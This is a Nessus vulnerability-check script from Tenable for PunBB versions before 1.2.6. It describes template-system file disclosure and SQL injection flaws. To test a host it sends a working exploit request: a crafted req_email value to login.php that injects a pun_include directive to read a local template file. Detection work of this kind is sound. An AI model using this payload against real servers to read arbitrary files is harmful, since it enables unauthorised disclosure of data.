#
# (C) Tenable Network Security
# 


if (description) {
  script_id(18658);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2005-2193");
  script_bugtraq_id(14195, 14196);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"17785");
    script_xref(name:"OSVDB", value:"17786");
  }

  name["english"] = "PunBB < 1.2.6 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected 
by multiple vulnerabilities.

Description :

The remote version of PunBB contains a flaw in its template system
that can be exploited to read arbitrary local files or, if an attacker
can upload a specially-crafted avatar, to execute arbitrary PHP code. 

In addition, the application fails to sanitize the 'temp' parameter of
the 'profile.php' script before using it in a database query, which
allows for SQL injection attacks.

See also : 

http://www.hardened-php.net/advisory-082005.php
http://www.hardened-php.net/advisory-092005.php

Solution : 

Upgrade to PunBB 1.2.6 or later.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:C)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Detects multiple vulnerabilities in PunBB < 1.2.6";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("punBB_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/punBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Check whether the script 'login.php' exists -- it's used in the exploit.
  req = http_get(item:string(dir, "/login.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ('method="post" action="login.php?action=in"' >< res) {
    # Try to exploit the flaw to read a file in the distribution.
    postdata = string(
      "form_sent=1&",
      'req_email=<pun_include%20"./include/template/main.tpl">@nessus.org'
    );
    req = string(
      "POST ", dir, "/login.php?action=forget HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if it looks like a template.
    if (egrep(string:res, pattern:"<pun_(head|page|title|char_encoding)>")) {
      security_warning(port);
      exit(0);
    }
  }
}
